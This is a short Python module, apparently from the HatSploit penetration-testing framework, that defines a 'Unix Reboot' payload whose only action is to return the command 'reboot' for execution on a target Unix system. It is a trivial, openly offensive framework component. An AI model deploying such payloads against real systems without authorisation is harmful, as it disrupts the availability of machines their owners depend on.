"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Unix Reboot",
            'Payload': "unix/generic/reboot",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "Reboot payload for unix.",
            'Arch': ARCH_GENERIC,
            'Platform': OS_UNIX,
            'Rank': "low",
            'Type': "one_side",
        })

    def run(self):
        return "reboot"
